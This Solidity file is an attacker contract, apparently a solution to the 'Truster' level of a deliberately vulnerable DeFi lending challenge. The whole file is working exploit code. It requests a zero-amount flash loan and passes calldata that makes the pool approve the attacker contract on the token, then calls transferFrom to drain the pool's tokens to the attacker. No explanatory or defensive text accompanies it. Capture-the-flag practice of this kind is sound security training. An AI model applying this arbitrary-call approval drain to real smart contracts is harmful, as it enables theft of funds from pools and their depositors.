// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

interface TrusterLenderPoolInterface {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external;
}

contract TrusterAttackerContract {
    address pool;
    address token;
    constructor (address poolAddress, address tokenAddress){
        pool = poolAddress;
        token = tokenAddress;
    }

    function drainLender(address attacker, uint256 tokenAmount) public{
        bytes memory callData = abi.encodeWithSignature("approve(address,uint256)", address(this), tokenAmount);
        TrusterLenderPoolInterface(pool).flashLoan(0, attacker, token, callData);

        IERC20(token).transferFrom(pool, attacker, tokenAmount);
    }
}